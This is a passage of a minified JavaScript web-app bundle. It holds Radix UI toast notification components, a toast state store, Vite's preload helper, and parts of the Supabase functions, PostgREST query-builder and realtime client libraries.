\`string\`.`),x.jsx(Md.Provider,{scope:t,children:x.jsx(tT,{scope:t,label:r,duration:s,swipeDirection:a,swipeThreshold:c,toastCount:f,viewport:h,onViewportChange:p,onToastAdd:S.useCallback(()=>m(w=>w+1),[]),onToastRemove:S.useCallback(()=>m(w=>w-1),[]),isFocusedToastEscapeKeyDownRef:y,isClosePausedRef:v,children:d})})};xy.displayName=Dd;var Ty="ToastViewport",nT=["F8"],Qc="toast.viewportPause",Yc="toast.viewportResume",Sy=S.forwardRef((i,t)=>{const{__scopeToast:r,hotkey:s=nT,label:a="Notifications ({hotkey})",...c}=i,d=la(Ty,r),h=Z2(r),p=S.useRef(null),f=S.useRef(null),m=S.useRef(null),y=S.useRef(null),v=hi(t,y,d.onViewportChange),w=s.join("+").replace(/Key/g,"").replace(/Digit/g,""),P=d.toastCount>0;S.useEffect(()=>{const C=L=>{s.length!==0&&s.every(M=>L[M]||L.code===M)&&y.current?.focus()};return document.addEventListener("keydown",C),()=>document.removeEventListener("keydown",C)},[s]),S.useEffect(()=>{const C=p.current,L=y.current;if(P&&C&&L){const R=()=>{if(!d.isClosePausedRef.current){const J=new CustomEvent(Qc);L.dispatchEvent(J),d.isClosePausedRef.current=!0}},M=()=>{if(d.isClosePausedRef.current){const J=new CustomEvent(Yc);L.dispatchEvent(J),d.isClosePausedRef.current=!1}},O=J=>{!C.contains(J.relatedTarget)&&M()},W=()=>{C.contains(document.activeElement)||M()};return C.addEventListener("focusin",R),C.addEventListener("focusout",O),C.addEventListener("pointermove",R),C.addEventListener("pointerleave",W),window.addEventListener("blur",R),window.addEventListener("focus",M),()=>{C.removeEventListener("focusin",R),C.removeEventListener("focusout",O),C.removeEventListener("pointermove",R),C.removeEventListener("pointerleave",W),window.removeEventListener("blur",R),window.removeEventListener("focus",M)}}},[P,d.isClosePausedRef]);const T=S.useCallback(({tabbingDirection:C})=>{const R=h().map(M=>{const O=M.ref.current,W=[O,...gT(O)];return C==="forwards"?W:W.reverse()});return(C==="forwards"?R.reverse():R).flat()},[h]);return S.useEffect(()=>{const C=y.current;if(C){const L=R=>{const M=R.altKey||R.ctrlKey||R.metaKey;if(R.key==="Tab"&&!M){const W=document.activeElement,J=R.shiftKey;if(R.target===C&&J){f.current?.focus();return}const ie=T({tabbingDirection:J?"backwards":"forwards"}),ge=ie.findIndex(Ae=>Ae===W);Sc(ie.slice(ge+1))?R.preventDefault():J?f.current?.focus():m.current?.focus()}};return C.addEventListener("keydown",L),()=>C.removeEventListener("keydown",L)}},[h,T]),x.jsxs(U2,{ref:p,role:"region","aria-label":a.replace("{hotkey}",w),tabIndex:-1,style:{pointerEvents:P?void 0:"none"},children:[P&&x.jsx(Xc,{ref:f,onFocusFromOutsideViewport:()=>{const C=T({tabbingDirection:"forwards"});Sc(C)}}),x.jsx(Md.Slot,{scope:r,children:x.jsx(Xt.ol,{tabIndex:-1,...c,ref:v})}),P&&x.jsx(Xc,{ref:m,onFocusFromOutsideViewport:()=>{const C=T({tabbingDirection:"backwards"});Sc(C)}})]})});Sy.displayName=Ty;var Ay="ToastFocusProxy",Xc=S.forwardRef((i,t)=>{const{__scopeToast:r,onFocusFromOutsideViewport:s,...a}=i,c=la(Ay,r);return x.jsx(Rd,{"aria-hidden":!0,tabIndex:0,...a,ref:t,style:{position:"fixed"},onFocus:d=>{const h=d.relatedTarget;!c.viewport?.contains(h)&&s()}})});Xc.displayName=Ay;var gs="Toast",iT="toast.swipeStart",rT="toast.swipeMove",sT="toast.swipeCancel",oT="toast.swipeEnd",Cy=S.forwardRef((i,t)=>{const{forceMount:r,open:s,defaultOpen:a,onOpenChange:c,...d}=i,[h,p]=K2({prop:s,defaultProp:a??!0,onChange:c,caller:gs});return x.jsx(wy,{present:r||h,children:x.jsx(cT,{open:h,...d,ref:t,onClose:()=>p(!1),onPause:pi(i.onPause),onResume:pi(i.onResume),onSwipeStart:Tt(i.onSwipeStart,f=>{f.currentTarget.setAttribute("data-swipe","start")}),onSwipeMove:Tt(i.onSwipeMove,f=>{const{x:m,y}=f.detail.delta;f.currentTarget.setAttribute("data-swipe","move"),f.currentTarget.style.setProperty("--radix-toast-swipe-move-x",`${m}px`),f.currentTarget.style.setProperty("--radix-toast-swipe-move-y",`${y}px`)}),onSwipeCancel:Tt(i.onSwipeCancel,f=>{f.currentTarget.setAttribute("data-swipe","cancel"),f.currentTarget.style.removeProperty("--radix-toast-swipe-move-x"),f.currentTarget.style.removeProperty("--radix-toast-swipe-move-y"),f.currentTarget.style.removeProperty("--radix-toast-swipe-end-x"),f.currentTarget.style.removeProperty("--radix-toast-swipe-end-y")}),onSwipeEnd:Tt(i.onSwipeEnd,f=>{const{x:m,y}=f.detail.delta;f.currentTarget.setAttribute("data-swipe","end"),f.currentTarget.style.removeProperty("--radix-toast-swipe-move-x"),f.currentTarget.style.removeProperty("--radix-toast-swipe-move-y"),f.currentTarget.style.setProperty("--radix-toast-swipe-end-x",`${m}px`),f.currentTarget.style.setProperty("--radix-toast-swipe-end-y",`${y}px`),p(!1)})})})});Cy.displayName=gs;var[aT,lT]=ky(gs,{onClose(){}}),cT=S.forwardRef((i,t)=>{const{__scopeToast:r,type:s="foreground",duration:a,open:c,onClose:d,onEscapeKeyDown:h,onPause:p,onResume:f,onSwipeStart:m,onSwipeMove:y,onSwipeCancel:v,onSwipeEnd:w,...P}=i,T=la(gs,r),[C,L]=S.useState(null),R=hi(t,H=>L(H)),M=S.useRef(null),O=S.useRef(null),W=a||T.duration,J=S.useRef(0),G=S.useRef(W),X=S.useRef(0),{onToastAdd:ie,onToastRemove:ge}=T,Ae=pi(()=>{C?.contains(document.activeElement)&&T.viewport?.focus(),d()}),$=S.useCallback(H=>{!H||H===1/0||(window.clearTimeout(X.current),J.current=new Date().getTime(),X.current=window.setTimeout(Ae,H))},[Ae]);S.useEffect(()=>{const H=T.viewport;if(H){const he=()=>{$(G.current),f?.()},oe=()=>{const ue=new Date().getTime()-J.current;G.current=G.current-ue,window.clearTimeout(X.current),p?.()};return H.addEventListener(Qc,oe),H.addEventListener(Yc,he),()=>{H.removeEventListener(Qc,oe),H.removeEventListener(Yc,he)}}},[T.viewport,W,p,f,$]),S.useEffect(()=>{c&&!T.isClosePausedRef.current&&$(W)},[c,W,T.isClosePausedRef,$]),S.useEffect(()=>(ie(),()=>ge()),[ie,ge]);const ae=S.useMemo(()=>C?My(C):null,[C]);return T.viewport?x.jsxs(x.Fragment,{children:[ae&&x.jsx(dT,{__scopeToast:r,role:"status","aria-live":s==="foreground"?"assertive":"polite","aria-atomic":!0,children:ae}),x.jsx(aT,{scope:r,onClose:Ae,children:_d.createPortal(x.jsx(Md.ItemSlot,{scope:r,children:x.jsx(V2,{asChild:!0,onEscapeKeyDown:Tt(h,()=>{T.isFocusedToastEscapeKeyDownRef.current||Ae(),T.isFocusedToastEscapeKeyDownRef.current=!1}),children:x.jsx(Xt.li,{role:"status","aria-live":"off","aria-atomic":!0,tabIndex:0,"data-state":c?"open":"closed","data-swipe-direction":T.swipeDirection,...P,ref:R,style:{userSelect:"none",touchAction:"none",...i.style},onKeyDown:Tt(i.onKeyDown,H=>{H.key==="Escape"&&(h?.(H.nativeEvent),H.nativeEvent.defaultPrevented||(T.isFocusedToastEscapeKeyDownRef.current=!0,Ae()))}),onPointerDown:Tt(i.onPointerDown,H=>{H.button===0&&(M.current={x:H.clientX,y:H.clientY})}),onPointerMove:Tt(i.onPointerMove,H=>{if(!M.current)return;const he=H.clientX-M.current.x,oe=H.clientY-M.current.y,ue=!!O.current,U=["left","right"].includes(T.swipeDirection),Q=["left","up"].includes(T.swipeDirection)?Math.min:Math.max,q=U?Q(0,he):0,E=U?0:Q(0,oe),B=H.pointerType==="touch"?10:2,te={x:q,y:E},de={originalEvent:H,delta:te};ue?(O.current=te,jo(rT,y,de,{discrete:!1})):ng(te,T.swipeDirection,B)?(O.current=te,jo(iT,m,de,{discrete:!1}),H.target.setPointerCapture(H.pointerId)):(Math.abs(he)>B||Math.abs(oe)>B)&&(M.current=null)}),onPointerUp:Tt(i.onPointerUp,H=>{const he=O.current,oe=H.target;if(oe.hasPointerCapture(H.pointerId)&&oe.releasePointerCapture(H.pointerId),O.current=null,M.current=null,he){const ue=H.currentTarget,U={originalEvent:H,delta:he};ng(he,T.swipeDirection,T.swipeThreshold)?jo(oT,w,U,{discrete:!0}):jo(sT,v,U,{discrete:!0}),ue.addEventListener("click",Q=>Q.preventDefault(),{once:!0})}})})})}),T.viewport)})]}):null}),dT=i=>{const{__scopeToast:t,children:r,...s}=i,a=la(gs,t),[c,d]=S.useState(!1),[h,p]=S.useState(!1);return pT(()=>d(!0)),S.useEffect(()=>{const f=window.setTimeout(()=>p(!0),1e3);return()=>window.clearTimeout(f)},[]),h?null:x.jsx(vy,{asChild:!0,children:x.jsx(Rd,{...s,children:c&&x.jsxs(x.Fragment,{children:[a.label," ",r]})})})},uT="ToastTitle",Ey=S.forwardRef((i,t)=>{const{__scopeToast:r,...s}=i;return x.jsx(Xt.div,{...s,ref:t})});Ey.displayName=uT;var hT="ToastDescription",Py=S.forwardRef((i,t)=>{const{__scopeToast:r,...s}=i;return x.jsx(Xt.div,{...s,ref:t})});Py.displayName=hT;var Iy="ToastAction",_y=S.forwardRef((i,t)=>{const{altText:r,...s}=i;return r.trim()?x.jsx(Dy,{altText:r,asChild:!0,children:x.jsx(jd,{...s,ref:t})}):(console.error(`Invalid prop \`altText\` supplied to \`${Iy}\`. Expected non-empty \`string\`.`),null)});_y.displayName=Iy;var Ry="ToastClose",jd=S.forwardRef((i,t)=>{const{__scopeToast:r,...s}=i,a=lT(Ry,r);return x.jsx(Dy,{asChild:!0,children:x.jsx(Xt.button,{type:"button",...s,ref:t,onClick:Tt(i.onClick,a.onClose)})})});jd.displayName=Ry;var Dy=S.forwardRef((i,t)=>{const{__scopeToast:r,altText:s,...a}=i;return x.jsx(Xt.div,{"data-radix-toast-announce-exclude":"","data-radix-toast-announce-alt":s||void 0,...a,ref:t})});function My(i){const t=[];return Array.from(i.childNodes).forEach(s=>{if(s.nodeType===s.TEXT_NODE&&s.textContent&&t.push(s.textContent),fT(s)){const a=s.ariaHidden||s.hidden||s.style.display==="none",c=s.dataset.radixToastAnnounceExclude==="";if(!a)if(c){const d=s.dataset.radixToastAnnounceAlt;d&&t.push(d)}else t.push(...My(s))}}),t}function jo(i,t,r,{discrete:s}){const a=r.originalEvent.currentTarget,c=new CustomEvent(i,{bubbles:!0,cancelable:!0,detail:r});t&&a.addEventListener(i,t,{once:!0}),s?fy(a,c):a.dispatchEvent(c)}var ng=(i,t,r=0)=>{const s=Math.abs(i.x),a=Math.abs(i.y),c=s>a;return t==="left"||t==="right"?c&&s>r:!c&&a>r};function pT(i=()=>{}){const t=pi(i);cs(()=>{let r=0,s=0;return r=window.requestAnimationFrame(()=>s=window.requestAnimationFrame(t)),()=>{window.cancelAnimationFrame(r),window.cancelAnimationFrame(s)}},[t])}function fT(i){return i.nodeType===i.ELEMENT_NODE}function gT(i){const t=[],r=document.createTreeWalker(i,NodeFilter.SHOW_ELEMENT,{acceptNode:s=>{const a=s.tagName==="INPUT"&&s.type==="hidden";return s.disabled||s.hidden||a?NodeFilter.FILTER_SKIP:s.tabIndex>=0?NodeFilter.FILTER_ACCEPT:NodeFilter.FILTER_SKIP}});for(;r.nextNode();)t.push(r.currentNode);return t}function Sc(i){const t=document.activeElement;return i.some(r=>r===t?!0:(r.focus(),document.activeElement!==t))}var mT=xy,jy=Sy,Oy=Cy,Ly=Ey,By=Py,Ny=_y,Fy=jd;const yT=1,bT=1e6,cn={ADD_TOAST:"ADD_TOAST",UPDATE_TOAST:"UPDATE_TOAST",DISMISS_TOAST:"DISMISS_TOAST",REMOVE_TOAST:"REMOVE_TOAST"};let Ac=0;function vT(){return Ac=(Ac+1)%Number.MAX_VALUE,Ac.toString()}const Cc=new Map,ig=i=>{if(Cc.has(i))return;const t=setTimeout(()=>{Cc.delete(i),is({type:cn.REMOVE_TOAST,toastId:i})},bT);Cc.set(i,t)},wT=(i,t)=>{switch(t.type){case cn.ADD_TOAST:return{...i,toasts:[t.toast,...i.toasts].slice(0,yT)};case cn.UPDATE_TOAST:return{...i,toasts:i.toasts.map(r=>r.id===t.toast.id?{...r,...t.toast}:r)};case cn.DISMISS_TOAST:{const{toastId:r}=t;return r?ig(r):i.toasts.forEach(s=>{ig(s.id)}),{...i,toasts:i.toasts.map(s=>s.id===r||r===void 0?{...s,open:!1}:s)}}case cn.REMOVE_TOAST:return t.toastId===void 0?{...i,toasts:[]}:{...i,toasts:i.toasts.filter(r=>r.id!==t.toastId)}}},zo=[];let Vo={toasts:[]};function is(i){Vo=wT(Vo,i),zo.forEach(t=>{t(Vo)})}function kT(i){const t=vT(),r=a=>is({type:cn.UPDATE_TOAST,toast:{...a,id:t}}),s=()=>is({type:cn.DISMISS_TOAST,toastId:t});return is({type:cn.ADD_TOAST,toast:{...i,id:t,open:!0,onOpenChange:a=>{a||s()}}}),{id:t,dismiss:s,update:r}}function Od(){const[i,t]=Ee.useState(Vo);return Ee.useEffect(()=>(zo.push(t),()=>{const r=zo.indexOf(t);r>-1&&zo.splice(r,1)}),[i]),{...i,toast:kT,dismiss:r=>is({type:cn.DISMISS_TOAST,toastId:r})}}const xT="modulepreload",TT=function(i){return"/"+i},rg={},ir=function(t,r,s){let a=Promise.resolve();if(r&&r.length>0){let p=function(f){return Promise.all(f.map(m=>Promise.resolve(m).then(y=>({status:"fulfilled",value:y}),y=>({status:"rejected",reason:y}))))};document.getElementsByTagName("link");const d=document.querySelector("meta[property=csp-nonce]"),h=d?.nonce||d?.getAttribute("nonce");a=p(r.map(f=>{if(f=TT(f),f in rg)return;rg[f]=!0;const m=f.endsWith(".css"),y=m?'[rel="stylesheet"]':"";if(document.querySelector(`link[href="${f}"]${y}`))return;const v=document.createElement("link");if(v.rel=m?"stylesheet":xT,m||(v.as="script"),v.crossOrigin="",v.href=f,h&&v.setAttribute("nonce",h),document.head.appendChild(v),m)return new Promise((w,P)=>{v.addEventListener("load",w),v.addEventListener("error",()=>P(new Error(`Unable to preload CSS for ${f}`)))})}))}function c(d){const h=new Event("vite:preloadError",{cancelable:!0});if(h.payload=d,window.dispatchEvent(h),!h.defaultPrevented)throw d}return a.then(d=>{for(const h of d||[])h.status==="rejected"&&c(h.reason);return t().catch(c)})},ST=i=>{let t;return i?t=i:typeof fetch>"u"?t=(...r)=>ir(async()=>{const{default:s}=await Promise.resolve().then(()=>ms);return{default:s}},void 0).then(({default:s})=>s(...r)):t=fetch,(...r)=>t(...r)};class Ld extends Error{constructor(t,r="FunctionsError",s){super(t),this.name=r,this.context=s}}class AT extends Ld{constructor(t){super("Failed to send a request to the Edge Function","FunctionsFetchError",t)}}class CT extends Ld{constructor(t){super("Relay Error invoking the Edge Function","FunctionsRelayError",t)}}class ET extends Ld{constructor(t){super("Edge Function returned a non-2xx status code","FunctionsHttpError",t)}}var PT=function(i,t,r,s){function a(c){return c instanceof r?c:new r(function(d){d(c)})}return new(r||(r=Promise))(function(c,d){function h(m){try{f(s.next(m))}catch(y){d(y)}}function p(m){try{f(s.throw(m))}catch(y){d(y)}}function f(m){m.done?c(m.value):a(m.value).then(h,p)}f((s=s.apply(i,t||[])).next())})};class IT{constructor(t,{headers:r={},customFetch:s}={}){this.url=t,this.headers=r,this.fetch=ST(s)}setAuth(t){this.headers.Authorization=`Bearer ${t}`}invoke(t,r={}){var s;return PT(this,void 0,void 0,function*(){try{const{headers:a,method:c,body:d}=r;let h={},p;d&&(a&&!Object.prototype.hasOwnProperty.call(a,"Content-Type")||!a)&&(typeof Blob<"u"&&d instanceof Blob||d instanceof ArrayBuffer?(h["Content-Type"]="application/octet-stream",p=d):typeof d=="string"?(h["Content-Type"]="text/plain",p=d):typeof FormData<"u"&&d instanceof FormData?p=d:(h["Content-Type"]="application/json",p=JSON.stringify(d)));const f=yield this.fetch(`${this.url}/${t}`,{method:c||"POST",headers:Object.assign(Object.assign(Object.assign({},h),this.headers),a),body:p}).catch(w=>{throw new AT(w)}),m=f.headers.get("x-relay-error");if(m&&m==="true")throw new CT(f);if(!f.ok)throw new ET(f);let y=((s=f.headers.get("Content-Type"))!==null&&s!==void 0?s:"text/plain").split(";")[0].trim(),v;return y==="application/json"?v=yield f.json():y==="application/octet-stream"?v=yield f.blob():y==="multipart/form-data"?v=yield f.formData():v=yield f.text(),{data:v,error:null}}catch(a){return{data:null,error:a}}})}}var _T=function(){if(typeof self<"u")return self;if(typeof window<"u")return window;if(typeof global<"u")return global;throw new Error("unable to locate global object")},rr=_T();const RT=rr.fetch,Bd=rr.fetch.bind(rr),zy=rr.Headers,DT=rr.Request,MT=rr.Response,ms=Object.freeze(Object.defineProperty({__proto__:null,Headers:zy,Request:DT,Response:MT,default:Bd,fetch:RT},Symbol.toStringTag,{value:"Module"}));class jT{constructor(t){this.shouldThrowOnError=!1,this.method=t.method,this.url=t.url,this.headers=t.headers,this.schema=t.schema,this.body=t.body,this.shouldThrowOnError=t.shouldThrowOnError,this.signal=t.signal,this.isMaybeSingle=t.isMaybeSingle,t.fetch?this.fetch=t.fetch:typeof fetch>"u"?this.fetch=Bd:this.fetch=fetch}throwOnError(){return this.shouldThrowOnError=!0,this}then(t,r){this.schema===void 0||(["GET","HEAD"].includes(this.method)?this.headers["Accept-Profile"]=this.schema:this.headers["Content-Profile"]=this.schema),this.method!=="GET"&&this.method!=="HEAD"&&(this.headers["Content-Type"]="application/json");const s=this.fetch;let a=s(this.url.toString(),{method:this.method,headers:this.headers,body:JSON.stringify(this.body),signal:this.signal}).then(async c=>{var d,h,p;let f=null,m=null,y=null,v=c.status,w=c.statusText;if(c.ok){if(this.method!=="HEAD"){const L=await c.text();L===""||(this.headers.Accept==="text/csv"||this.headers.Accept&&this.headers.Accept.includes("application/vnd.pgrst.plan+text")?m=L:m=JSON.parse(L))}const T=(d=this.headers.Prefer)===null||d===void 0?void 0:d.match(/count=(exact|planned|estimated)/),C=(h=c.headers.get("content-range"))===null||h===void 0?void 0:h.split("/");T&&C&&C.length>1&&(y=parseInt(C[1])),this.isMaybeSingle&&this.method==="GET"&&Array.isArray(m)&&(m.length>1?(f={code:"PGRST116",details:`Results contain ${m.length} rows, application/vnd.pgrst.object+json requires 1 row`,hint:null,message:"JSON object requested, multiple (or no) rows returned"},m=null,y=null,v=406,w="Not Acceptable"):m.length===1?m=m[0]:m=null)}else{const T=await c.text();try{f=JSON.parse(T),Array.isArray(f)&&c.status===404&&(m=[],f=null,v=200,w="OK")}catch{c.status===404&&T===""?(v=204,w="No Content"):f={message:T}}if(f&&this.isMaybeSingle&&(!((p=f?.details)===null||p===void 0)&&p.includes("0 rows"))&&(f=null,v=200,w="OK"),f&&this.shouldThrowOnError)throw f}return{error:f,data:m,count:y,status:v,statusText:w}});return this.shouldThrowOnError||(a=a.catch(c=>{var d,h,p;return{error:{message:`${(d=c?.name)!==null&&d!==void 0?d:"FetchError"}: ${c?.message}`,details:`${(h=c?.stack)!==null&&h!==void 0?h:""}`,hint:"",code:`${(p=c?.code)!==null&&p!==void 0?p:""}`},data:null,count:null,status:0,statusText:""}})),a.then(t,r)}}class OT extends jT{select(t){let r=!1;const s=(t??"*").split("").map(a=>/\s/.test(a)&&!r?"":(a==='"'&&(r=!r),a)).join("");return this.url.searchParams.set("select",s),this.headers.Prefer&&(this.headers.Prefer+=","),this.headers.Prefer+="return=representation",this}order(t,{ascending:r=!0,nullsFirst:s,foreignTable:a,referencedTable:c=a}={}){const d=c?`${c}.order`:"order",h=this.url.searchParams.get(d);return this.url.searchParams.set(d,`${h?`${h},`:""}${t}.${r?"asc":"desc"}${s===void 0?"":s?".nullsfirst":".nullslast"}`),this}limit(t,{foreignTable:r,referencedTable:s=r}={}){const a=typeof s>"u"?"limit":`${s}.limit`;return this.url.searchParams.set(a,`${t}`),this}range(t,r,{foreignTable:s,referencedTable:a=s}={}){const c=typeof a>"u"?"offset":`${a}.offset`,d=typeof a>"u"?"limit":`${a}.limit`;return this.url.searchParams.set(c,`${t}`),this.url.searchParams.set(d,`${r-t+1}`),this}abortSignal(t){return this.signal=t,this}single(){return this.headers.Accept="application/vnd.pgrst.object+json",this}maybeSingle(){return this.method==="GET"?this.headers.Accept="application/json":this.headers.Accept="application/vnd.pgrst.object+json",this.isMaybeSingle=!0,this}csv(){return this.headers.Accept="text/csv",this}geojson(){return this.headers.Accept="application/geo+json",this}explain({analyze:t=!1,verbose:r=!1,settings:s=!1,buffers:a=!1,wal:c=!1,format:d="text"}={}){var h;const p=[t?"analyze":null,r?"verbose":null,s?"settings":null,a?"buffers":null,c?"wal":null].filter(Boolean).join("|"),f=(h=this.headers.Accept)!==null&&h!==void 0?h:"application/json";return this.headers.Accept=`application/vnd.pgrst.plan+${d}; for="${f}"; options=${p};`,d==="json"?this:this}rollback(){var t;return((t=this.headers.Prefer)!==null&&t!==void 0?t:"").trim().length>0?this.headers.Prefer+=",tx=rollback":this.headers.Prefer="tx=rollback",this}returns(){return this}}class Ki extends OT{eq(t,r){return this.url.searchParams.append(t,`eq.${r}`),this}neq(t,r){return this.url.searchParams.append(t,`neq.${r}`),this}gt(t,r){return this.url.searchParams.append(t,`gt.${r}`),this}gte(t,r){return this.url.searchParams.append(t,`gte.${r}`),this}lt(t,r){return this.url.searchParams.append(t,`lt.${r}`),this}lte(t,r){return this.url.searchParams.append(t,`lte.${r}`),this}like(t,r){return this.url.searchParams.append(t,`like.${r}`),this}likeAllOf(t,r){return this.url.searchParams.append(t,`like(all).{${r.join(",")}}`),this}likeAnyOf(t,r){return this.url.searchParams.append(t,`like(any).{${r.join(",")}}`),this}ilike(t,r){return this.url.searchParams.append(t,`ilike.${r}`),this}ilikeAllOf(t,r){return this.url.searchParams.append(t,`ilike(all).{${r.join(",")}}`),this}ilikeAnyOf(t,r){return this.url.searchParams.append(t,`ilike(any).{${r.join(",")}}`),this}is(t,r){return this.url.searchParams.append(t,`is.${r}`),this}in(t,r){const s=r.map(a=>typeof a=="string"&&new RegExp("[,()]").test(a)?`"${a}"`:`${a}`).join(",");return this.url.searchParams.append(t,`in.(${s})`),this}contains(t,r){return typeof r=="string"?this.url.searchParams.append(t,`cs.${r}`):Array.isArray(r)?this.url.searchParams.append(t,`cs.{${r.join(",")}}`):this.url.searchParams.append(t,`cs.${JSON.stringify(r)}`),this}containedBy(t,r){return typeof r=="string"?this.url.searchParams.append(t,`cd.${r}`):Array.isArray(r)?this.url.searchParams.append(t,`cd.{${r.join(",")}}`):this.url.searchParams.append(t,`cd.${JSON.stringify(r)}`),this}rangeGt(t,r){return this.url.searchParams.append(t,`sr.${r}`),this}rangeGte(t,r){return this.url.searchParams.append(t,`nxl.${r}`),this}rangeLt(t,r){return this.url.searchParams.append(t,`sl.${r}`),this}rangeLte(t,r){return this.url.searchParams.append(t,`nxr.${r}`),this}rangeAdjacent(t,r){return this.url.searchParams.append(t,`adj.${r}`),this}overlaps(t,r){return typeof r=="string"?this.url.searchParams.append(t,`ov.${r}`):this.url.searchParams.append(t,`ov.{${r.join(",")}}`),this}textSearch(t,r,{config:s,type:a}={}){let c="";a==="plain"?c="pl":a==="phrase"?c="ph":a==="websearch"&&(c="w");const d=s===void 0?"":`(${s})`;return this.url.searchParams.append(t,`${c}fts${d}.${r}`),this}match(t){return Object.entries(t).forEach(([r,s])=>{this.url.searchParams.append(r,`eq.${s}`)}),this}not(t,r,s){return this.url.searchParams.append(t,`not.${r}.${s}`),this}or(t,{foreignTable:r,referencedTable:s=r}={}){const a=s?`${s}.or`:"or";return this.url.searchParams.append(a,`(${t})`),this}filter(t,r,s){return this.url.searchParams.append(t,`${r}.${s}`),this}}class LT{constructor(t,{headers:r={},schema:s,fetch:a}){this.url=t,this.headers=r,this.schema=s,this.fetch=a}select(t,{head:r=!1,count:s}={}){const a=r?"HEAD":"GET";let c=!1;const d=(t??"*").split("").map(h=>/\s/.test(h)&&!c?"":(h==='"'&&(c=!c),h)).join("");return this.url.searchParams.set("select",d),s&&(this.headers.Prefer=`count=${s}`),new Ki({method:a,url:this.url,headers:this.headers,schema:this.schema,fetch:this.fetch,allowEmpty:!1})}insert(t,{count:r,defaultToNull:s=!0}={}){const a="POST",c=[];if(this.headers.Prefer&&c.push(this.headers.Prefer),r&&c.push(`count=${r}`),s||c.push("missing=default"),this.headers.Prefer=c.join(","),Array.isArray(t)){const d=t.reduce((h,p)=>h.concat(Object.keys(p)),[]);if(d.length>0){const h=[...new Set(d)].map(p=>`"${p}"`);this.url.searchParams.set("columns",h.join(","))}}return new Ki({method:a,url:this.url,headers:this.headers,schema:this.schema,body:t,fetch:this.fetch,allowEmpty:!1})}upsert(t,{onConflict:r,ignoreDuplicates:s=!1,count:a,defaultToNull:c=!0}={}){const d="POST",h=[`resolution=${s?"ignore":"merge"}-duplicates`];if(r!==void 0&&this.url.searchParams.set("on_conflict",r),this.headers.Prefer&&h.push(this.headers.Prefer),a&&h.push(`count=${a}`),c||h.push("missing=default"),this.headers.Prefer=h.join(","),Array.isArray(t)){const p=t.reduce((f,m)=>f.concat(Object.keys(m)),[]);if(p.length>0){const f=[...new Set(p)].map(m=>`"${m}"`);this.url.searchParams.set("columns",f.join(","))}}return new Ki({method:d,url:this.url,headers:this.headers,schema:this.schema,body:t,fetch:this.fetch,allowEmpty:!1})}update(t,{count:r}={}){const s="PATCH",a=[];return this.headers.Prefer&&a.push(this.headers.Prefer),r&&a.push(`count=${r}`),this.headers.Prefer=a.join(","),new Ki({method:s,url:this.url,headers:this.headers,schema:this.schema,body:t,fetch:this.fetch,allowEmpty:!1})}delete({count:t}={}){const r="DELETE",s=[];return t&&s.push(`count=${t}`),this.headers.Prefer&&s.unshift(this.headers.Prefer),this.headers.Prefer=s.join(","),new Ki({method:r,url:this.url,headers:this.headers,schema:this.schema,fetch:this.fetch,allowEmpty:!1})}}const BT="1.9.0",NT={"X-Client-Info":`postgrest-js/${BT}`};class Nd{constructor(t,{headers:r={},schema:s,fetch:a}={}){this.url=t,this.headers=Object.assign(Object.assign({},NT),r),this.schemaName=s,this.fetch=a}from(t){const r=new URL(`${this.url}/${t}`);return new LT(r,{headers:Object.assign({},this.headers),schema:this.schemaName,fetch:this.fetch})}schema(t){return new Nd(this.url,{headers:this.headers,schema:t,fetch:this.fetch})}rpc(t,r={},{head:s=!1,count:a}={}){let c;const d=new URL(`${this.url}/rpc/${t}`);let h;s?(c="HEAD",Object.entries(r).forEach(([f,m])=>{d.searchParams.append(f,`${m}`)})):(c="POST",h=r);const p=Object.assign({},this.headers);return a&&(p.Prefer=`count=${a}`),new Ki({method:c,url:d,headers:p,schema:this.schemaName,body:h,fetch:this.fetch,allowEmpty:!1})}}const FT="2.9.1",zT={"X-Client-Info":`realtime-js/${FT}`},VT="1.0.0",Vy=1e4,UT=1e3;var er;(function(i){i[i.connecting=0]="connecting",i[i.open=1]="open",i[i.closing=2]="closing",i[i.closed=3]="closed"})(er||(er={}));var xt;(function(i){i.closed="closed",i.errored="errored",i.joined="joined",i.joining="joining",i.leaving="leaving"})(xt||(xt={}));var $t;(function(i){i.close="phx_close",i.error="phx_error",i.join="phx_join",i.reply="phx_reply",i.leave="phx_leave",i.access_token="access_token"})($t||($t={}));var Zc;(function(i){i.websocket="websocket"})(Zc||(Zc={}));var li;(function(i){i.Connecting="connecting",i.Open="open",i.Closing="closing",i.Closed="closed"})(li||(li={}));class Uy{constructor(t,r){this.callback=t,this.timerCalc=r,this.timer=void 0,this.tries=0,this.callback=t,this.timerCalc=r}reset(){this.tries=0,clearTimeout(this.timer)}scheduleTimeout(){clearTimeout(this.timer),this.timer=setTimeout(()=>{this.tries=this.tries+1,this.callback()},this.timerCalc(this.tries+1))}}class WT{constructor(){this.HEADER_LENGTH=1}decode(t,r){return t.constructor===ArrayBuffer?r(this._binaryDecode(t)):r(typeof t=="string"?JSON.parse(t):{})}_binaryDecode(t){const r=new DataView(t),s=new TextDecoder;return this._decodeBroadcast(t,r,s)}_decodeBroadcast(t,r,s){const a=r.getUint8(1),c=r.getUint8(2);let d=this.HEADER_LENGTH+2;const h=s.decode(t.slice(d,d+a));d=d+a;const p=s.decode(t.slice(d,d+c));d=d+c;const f=JSON.parse(s.decode(t.slice(d,t.byteLength)));return{ref:null,topic:h,event:p,payload:f}}}class Ec{constructor(t,r,s={},a=Vy){this.channel=t,this.event=r,this.payload=s,this.timeout=a,this.sent=!1,this.timeoutTimer=void 0,this.ref="",this.receivedResp=null,this.recHooks=[],this.refEvent=null}resend(t){this.timeout=t,this._cancelRefEvent(),this.ref="",this.refEvent=null,this.receivedResp=null,this.sent=!1,this.send()}send(){this._hasReceived("timeout")||(this.startTimeout(),this.sent=!0,this.channel.socket.push({topic:this.channel.topic,event:this.event,payload:this.payload,ref:this.ref,join_ref:this.channel._joinRef()}))}updatePayload(t){this.payload=Object.assign(Object.assign({},this.payload),t)}receive(t,r){var s;return this._hasReceived(t)&&r((s=this.receivedResp)===null||s===void 0?void 0:s.response),this.recHooks.push({status:t,callback:r}),this}startTimeout(){if(this.timeoutTimer)return;this.ref=this.channel.socket._makeRef(),this.refEvent=this.channel._replyEventName(this.ref);const t=r=>{this._cancelRefEvent(),this._cancelTimeout(),this.receivedResp=r,this._matchReceive(r)};this.channel._on(this.refEvent,{},t),this.timeoutTimer=setTimeout(()=>{this.trigger("timeout",{})},this.timeout)}trigger(t,r){this.refEvent&&this.channel._trigger(this.refEvent,{status:t,response:r})}destroy(){this._cancelRefEvent(),this._cancelTimeout()}_cancelRefEvent(){this.refEvent&&this.channel._off(this.refEvent,{})}_cancelTimeout(){clearTimeout(this.timeoutTimer),this.timeoutTimer=void 